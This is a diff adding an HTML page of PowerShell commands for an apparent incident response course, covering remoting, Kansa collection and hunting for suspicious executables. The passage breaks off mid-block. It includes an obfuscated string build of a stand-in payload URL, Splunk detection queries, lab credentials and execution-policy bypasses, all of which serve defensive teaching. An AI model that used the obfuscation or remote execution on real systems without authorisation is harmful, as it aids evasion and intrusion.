+  <pre>Get-ScheduledTask | Get-ScheduledTaskInfo | Sort-Object LastRunTime -Descending | Select-Object TaskName, LastRunTime -First 5</pre>
+</div>
+
+<h4>Display PowerShell host info</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Host | Format-Table Name, Version, InstanceId</pre>
+</div>
+
+<h4>Select service Name, Status, and StartType</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Service | Select-Object Name, Status, StartType</pre>
+</div>
+
+<h4>Select last 5 services</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Service | Select-Object Name, Status, StartType | Select-Object -Last 5</pre>
+</div>
+
+<h4>Sort services by Status</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Service | Format-Table Name, Status | Sort-Object Status</pre>
+</div>
+
+<h4>Export process info to CSV</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | Select-Object Name, Id, Path | Export-Csv -Path "C:\Users\tcm\Downloads\processes.csv" -NoTypeInformation</pre>
+</div>
+
+<h4>Export processes to XML</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | Export-Clixml -Path "C:\Users\tcm\Downloads\processes.xml"</pre>
+</div>
+
+<h4>Export services to JSON</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Service | ConvertTo-Json | Out-File "C:\Users\tcm\Downloads\services.json"</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/uSyKRN">PowerShell Documentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/telX9P">Export-Csv (Microsoft)</a></li>
+</ul>
+
+
+<h1>PowerShell 101: Providers</h1>
+
+<h4>List all PowerShell providers</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-PSProvider</pre>
+</div>
+
+<h4>List all PowerShell drives</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-PSDrive</pre>
+</div>
+
+<h4>Display detailed information about the HKCU PowerShell drive</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-PSDrive HKCU | Format-List *</pre>
+</div>
+
+<h4>List all aliases using the Alias: provider</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>gci Alias:</pre>
+</div>
+
+<h4>Change directory to the Alias provider</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd Alias:</pre>
+</div>
+
+<h4>Get the alias for the 'ls' command</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Item ls</pre>
+</div>
+
+<h4>Create a new alias named 'test' for Get-ChildItem using Set-Alias</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-Alias -Name test -Value Get-ChildItem</pre>
+</div>
+
+<h4>Create a new alias named 'test' for Get-ChildItem using New-Item</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>New-Item Alias:test -Value Get-ChildItem</pre>
+</div>
+
+<h4>List all items under HKCU:\Software and display in wide format</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-ChildItem HKCU:\Software | Format-Wide</pre>
+</div>
+
+<h4>Get registry values from the Run key under CurrentVersion</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/uSyKRN">PowerShell Documentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/cf6p3l">PowerShell Providers (Microsoft)</a></li>
+</ul>
+
+<h1>PowerShell 101: Variables and Data Types</h1>
+
+<h4>Assign a string value to a variable</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$name = "Bob"</pre>
+</div>
+
+<h4>Retrieve the Windows Product Name from the registry</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$product = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName</pre>
+</div>
+
+<h4>Display only the ProductName property value</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$product.ProductName</pre>
+</div>
+
+<h4>Retrieve the ProductName directly in a single line</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$product = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName).ProductName</pre>
+</div>
+
+<h4>Concatenate multiple strings to form a URL</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$part1 = "http" + "://mal"
+$part2 = "ici" + "ous.si" + "te/pa"
+$part3 = "yload." + ([char]112) + ([char]115) + ([char]49)
+$uRl = $part1 + $part2 + $part3</pre>
+</div>
+
+<h4>Get the data type of an integer variable</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$count = 5
+$count.GetType().Name</pre>
+</div>
+
+<h4>Get the data type of a string variable</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$name = "Bob"
+$name.GetType().Name</pre>
+</div>
+
+<h4>Get the data type of a boolean variable</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$flag = $true
+$flag.GetType().Name</pre>
+</div>
+
+<h4>Get the data type of an array</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$list = 1, 2, 3
+$list.GetType().Name</pre>
+</div>
+
+<h4>Convert a string to an integer and get its type</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>[int]$x = "5"
+$x.GetType().Name</pre>
+</div>
+
+<h4>Get the length of a string</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$name = "Longer Than Bob"
+$name.Length</pre>
+</div>
+
+<h4>Get the current date and time</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$date = Get-Date</pre>
+</div>
+
+<h4>Get the current day of the week</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$date.DayOfWeek</pre>
+</div>
+
+<h4>Get the current day of the month and month number</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$date.Day
+$date.Month</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/uSyKRN">PowerShell Documentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/danqsD">PowerShell Variables (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/ZuEWf8">PowerShell Data Types (Microsoft)</a></li>
+</ul>
+
+<h1>PowerShell 101: Control Flow</h1>
+
+<h4>Basic if statement structure</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>if ($condition) {
+    # Runs if the condition is true
+}</pre>
+</div>
+
+<h4>Change directory to the lab folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\5fffd371</pre>
+</div>
+
+<h4>Set PowerShell execution policy for the current process</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-ExecutionPolicy Bypass -Scope Process</pre>
+</div>
+
+<h4>If-Else statement structure</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>if ($condition) {
+    # Runs if the condition is true
+} else {
+    # Runs if the condition is false
+}</pre>
+</div>
+
+<h4>If-ElseIf-Else structure</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>if ($condition1) {
+    # Runs if condition1 is true
+} elseif ($condition2) {
+    # Runs if condition1 is false AND condition2 is true
+} else {
+    # Runs if none of the above conditions are true
+}</pre>
+</div>
+
+<h4>Foreach loop structure</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>foreach ($item in $collection) {
+    # Do something with $item
+}</pre>
+</div>
+
+<h4>Example: list all process names with ForEach-Object</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process | ForEach-Object { $_.ProcessName }</pre>
+</div>
+
+<h4>For loop example</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>for ($i = 0; $i -lt 5; $i++) {
+    # Code to run for each iteration
+}</pre>
+</div>
+
+<h4>While loop example</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>while ($true) {
+    # Run continually unless we break out
+}</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/uSyKRN">PowerShell Documentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/sKEcLD">Flow Control (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/HVVBvB">PowerShell - Try, Catch, and Finally (Microsoft)</a></li>
+</ul>
+
+
+<h1>Working with WMI and CIM</h1>
+
+<h4>List all PowerShell commands with nouns starting with WMI</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Command -Noun WMI*</pre>
+</div>
+
+<h4>Retrieve operating system details using Get-WmiObject</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-WmiObject Win32_OperatingSystem | Format-List</pre>
+</div>
+
+<h4>Retrieve operating system details using Get-CimInstance</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-CimInstance Win32_OperatingSystem | Format-List</pre>
+</div>
+
+<h4>List all commands from the CimCmdlets module</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Command -Module CimCmdlets</pre>
+</div>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/vbUorx">Windows Management Instrumentation (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/48PCSv">Common Information Model (DMFT)</a></li>
+</ul>
+
+
+<h1>Live Incident Response Using PowerShell</h1>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/PSIR">PowerShell Incident Response Cheat Sheet</a></li>
+  <li><a target="_blank" href="https://soc201.com/YygzAJ">Kansa</a></li>
+  <li><a target="_blank" href="https://soc201.com/u3cBSA">Invoke-IR (PowerForensics)</a></li>
+  <li><a target="_blank" href="https://soc201.com/U4iCFN">PowerShell Rapid Response (PoSh-R2)</a></li>
+  <li><a target="_blank" href="https://soc201.com/jLNgnU">PSRecon</a></li>
+</ul>
+
+<h1>PowerShell Remoting</h1>
+
+<h4>Get a list of processes from a remote computer</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Process -ComputerName WKS-4F1D</pre>
+</div>
+
+<h4>Find commands that have a ComputerName parameter</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Command -ParameterName ComputerName</pre>
+</div>
+
+<h4>Enable PowerShell remoting on the local computer</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Enable-PSRemoting -Force</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/ByKsGR">PowerShell Remoting (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/55zhiQ">Windows Remote Management (Microsoft)</a></li>
+</ul>
+
+<h1>PS Remoting: One-to-One Remoting</h1>
+
+<h4>Prompt for credentials</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$Cred = Get-Credential</pre>
+</div>
+
+<p><b>Username:</b> tcm</p>
+<p><b>Password:</b> password</p>
+
+<h4>Start an interactive remote session (host: windows)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Enter-PSSession -ComputerName windows -Credential $Cred</pre>
+</div>
+
+<h4>Start an interactive remote session (host: WKS-4F1D)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Enter-PSSession -ComputerName WKS-4F1D -Credential $Cred</pre>
+</div>
+
+<h4>Exit an interactive remote session</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Exit-PSSession</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/ByKsGR">PowerShell Remoting (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/55zhiQ">Windows Remote Management (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/v9iaSr">Enter-PSSession (Microsoft)</a></li>
+</ul>
+
+<h1>PS Remoting: One-to-Many Remoting</h1>
+
+<h4>Run Get-Process remotely on WKS-4F1D</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Invoke-Command -Credential $Cred -ComputerName WKS-4F1D -ScriptBlock { Get-Process }</pre>
+</div>
+
+<h4>Run Get-Process remotely and select first 5 processes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Invoke-Command -Credential $Cred -ComputerName WKS-4F1D -ScriptBlock { Get-Process | Select-Object -First 5 Name, Id }</pre>
+</div>
+
+<h4>Get remote OS info via CIM and select CSName and LastBootUpTime</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Invoke-Command -Credential $Cred -ComputerName WKS-4F1D -ScriptBlock { Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object CSName, LastBootUpTime }</pre>
+</div>
+
+<h4>Export remote process list to CSV</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Invoke-Command -Credential $Cred -ComputerName WKS-4F1D -ScriptBlock { Get-Process } | Export-Csv C:\Users\tcm\Downloads\Process_Results.csv -NoTypeInformation</pre>
+</div>
+
+<h4>Open the exported CSV in Notepad</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>notepad C:\Users\tcm\Downloads\Process_Results.csv</pre>
+</div>
+
+<h4>Export remote service list to CSV</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Invoke-Command -Credential $Cred -ComputerName WKS-4F1D -ScriptBlock { Get-Service | Select-Object Name, Status, StartType } | Export-Csv C:\Users\tcm\Downloads\Service_Results.csv -NoTypeInformation</pre>
+</div>
+
+<h4>Change directory to lab folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\f32f28fc</pre>
+</div>
+
+<h4>Set execution policy to bypass for current process</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-ExecutionPolicy Bypass -Scope Process -Force</pre>
+</div>
+
+<h4>Run local DFIR script</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\DFIR-Script.ps1</pre>
+</div>
+
+<h4>Invoke DFIR script remotely on WKS-4F1D</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Invoke-Command -Credential $Cred -ComputerName WKS-4F1D -FilePath .\DFIR-Script.ps1</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/ByKsGR">PowerShell Remoting (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/55zhiQ">Windows Remote Management (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/BS7sjV">Invoke-Command (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/leSDz3">DFIR-Script.ps1 (Bert-Jan, GitHub)</a></li>
+</ul>
+
+<h1>PowerShell Authentication</h1>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/ByKsGR">PowerShell Remoting (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/55zhiQ">Windows Remote Management (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/hrVvG7">Logon Type Reference (Microsoft)</a></li>
+</ul>
+
+<h1>Malicious PowerShell Usage</h1>
+
+<h4>Search PowerShell Operational log for remote session activity (EventID 4103)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index=main Source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventID=4103
+(Payload=*pssession* OR Payload=*psremoting* OR Payload=*invoke-command* OR Payload=*-computer* OR Payload=*winrm* OR Payload=*wsman*)</pre>
+</div>
+
+<h4>Search PowerShell Operational log for remote session activity in script blocks (EventID 4104)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index=main Source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventID=4104
+(ScriptBlockText=*pssession* OR ScriptBlockText=*psremoting* OR ScriptBlockText=*invoke-command* OR ScriptBlockText=*-computer* OR ScriptBlockText=*winrm* OR ScriptBlockText=*wsman*)</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/ByKsGR">PowerShell Remoting (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/55zhiQ">Windows Remote Management (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/m-trends">Mandiant (Google Cloud Security): M-Trends Report</a></li>
+  <li><a target="_blank" href="https://soc201.com/WxxSc8">PowerShell Auditing Configuration Guide (ManageEngine)</a></li>
+  <li><a target="_blank" href="https://soc201.com/eW2rdH">Hunting for Malicious PowerShell using Script Block Logging (Splunk)</a></li>
+  <li><a target="_blank" href="https://soc201.com/3MIHAG">Splunk Security Content (GitHub)</a></li>
+</ul>
+
+<h1>Introduction to the Kansa IR Framework</h1>
+
+<h4>Change directory to lab folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\03b30c4f</pre>
+</div>
+
+<h4>Change directory to Modules subfolder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd .\Modules\</pre>
+</div>
+
+<h4>Open Modules configuration file in Notepad</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>notepad .\Modules.conf</pre>
+</div>
+
+<h4>Open default PowerShell template in Notepad</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>notepad .\default-template.ps1</pre>
+</div>
+
+<h4>Open Get-Autorunsc script in Notepad</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>notepad Get-Autorunsc.ps1</pre>
+</div>
+
+<h4>Run Get-File script on hosts file</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\Get-File.ps1 C:\Windows\System32\drivers\etc\hosts</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/YygzAJ">Kansa IR Framework (Dave Hull)</a></li>
+  <li><a target="_blank" href="https://soc201.com/S79ivJ">Kansa for Enterprise Scale Threat Hunting (Jon Ketchum)</a></li>
+  <li><a target="_blank" href="https://soc201.com/WrGNIB">Forensic Analysis of the UserAssist Artifact (Magnet Forensics)</a></li>
+  <li><a target="_blank" href="https://soc201.com/8vkeYl">Forensic Analysis of Prefetch Files (Magnet Forensics)</a></li>
+</ul>
+
+<h1>Kansa: Remote Collection</h1>
+
+<h4>Get help for kansa.ps1 script</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Help .\kansa.ps1</pre>
+</div>
+
+<h4>Run kansa.ps1 on local computer with verbose output</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\kansa.ps1 -Target $env:COMPUTERNAME -Authentication Negotiate -Credential (Get-Credential) -Verbose</pre>
+</div>
+
+<h4>Open Kansa modules configuration in Notepad</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>notepad Modules\modules.conf</pre>
+</div>
+
+<h4>Copy Autoruns executable to Kansa Modules bin folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Copy-Item "C:\Users\tcm\Desktop\SysInternals\Autoruns\autorunsc.exe" -Destination "C:\Users\tcm\Desktop\Class_Files\labs\03b30c4f\Kansa\Modules\bin" -Force</pre>
+</div>
+
+<h4>Run kansa.ps1 remotely on WKS-4F1D with binary push and remove options</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\kansa.ps1 -Target WKS-4F1D -Authentication Negotiate -Credential (Get-Credential) -Pushbin -Rmbin -Verbose</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/YygzAJ">Kansa IR Framework (Dave Hull)</a></li>
+  <li><a target="_blank" href="https://soc201.com/gFVsUQ">Remote Server Administration Tools (Microsoft)</a></li>
+  <li><a target="_blank" href="https://soc201.com/KCshyC">Sysinternals Autoruns (Microsoft)</a></li>
+</ul>
+
+<h1>Kansa: Collection Analysis</h1>
+
+<h4>Change directory to lab folder and create Analysis_Test folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\03b30c4f
+mkdir Analysis_Test</pre>
+</div>
+
+<h4>Copy Get-PrefetchListingStack script to current directory</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cp ..\Kansa\Analysis\process\Get-PrefetchListingStack.ps1 .</pre>
+</div>
+
+<h4>Copy PrefetchListing CSV files to current directory</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cp ..\precooked\Output_20250814162339\PrefetchListing\*-PrefetchListing.csv .</pre>
+</div>
+
+<h4>Set PowerShell execution policy to bypass for the session</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Set-ExecutionPolicy Bypass -Scope Process -Force</pre>
+</div>
+
+<h4>Open Get-PrefetchListingStack script in Notepad</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>notepad .\Get-PrefetchListingStack.ps1</pre>
+</div>
+
+<h4>Run Get-PrefetchListingStack script</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\Get-PrefetchListingStack.ps1</pre>
+</div>
+
+<h4>Run script and redirect output to CSV</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>.\Get-PrefetchListingStack.ps1 > PrefetchListingStack_1.csv</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/YygzAJ">Kansa IR Framework (Dave Hull)</a></li>
+  <li><a target="_blank" href="https://soc201.com/G9OU3N">Log Parser (Microsoft)</a></li>
+</ul>
+
+<h1>Collection and Analysis Challenge</h1>
+
+<button class="toggle-btn" onclick="const div=this.nextElementSibling;div.style.display=getComputedStyle(div).display==='none'?'block':'none'">
+  Show/Hide Challenge Solution
+</button>
+
+<div class="hidden-content">
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\Net\Get-DNSCacheStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>notepad .\Get-DNSCacheStack.ps1</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-DNSCacheStack.ps1 > DNSCacheStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *DNSCache.csv -Pattern "githubusercontent.com"</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *DNSCache.csv -Pattern "githubusercontent.com" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd .\ProcsWMI\</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\process\Get-ProcsWMIProcessNameStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-ProcsWMIProcessNameStack.ps1 > ProcsWMIProcessNameStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\process\Get-ProcsWMIPath.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>notepad .\Get-ProcsWMIPath.ps1</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-ProcsWMIPath.ps1 > ProcsWMIPath.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String "ggWmgFMT.exe" *ProcsWMI.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String "L9XJe2iA.exe" *ProcsWMI.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\process\Get-ProcsWMICLIMD5Stack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-ProcsWMICLIMD5Stack.ps1 > Get-ProcsWMICLIMD5Stack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\Netstat</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\Analysis\Get-NetstatProcessDetailStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-NetstatProcessDetailStack.ps1 > NetstatProcessDetailStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *Netstat.csv -Pattern "L9XJe2iA.exe" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Get-ChildItem "C:\users\tcm\Desktop\Class_Files\challenges\IR-8842\Output_20250820145332" -Recurse -File | Select-String -Pattern "ggWmgFMT\.exe","L9XJe2iA\.exe" | Select-Object -Unique Path</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\PrefetchListing\</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\process\Get-PrefetchListingStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-PrefetchListingStack.ps1 > PrefetchListingStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Get-ChildItem "C:\users\tcm\Desktop\Class_Files\challenges\IR-8842\Output_20250820145332" -Recurse -File | Select-String -Pattern "APPRUNTIME.EXE" | Select-Object -Unique Path</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\SmbSession</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
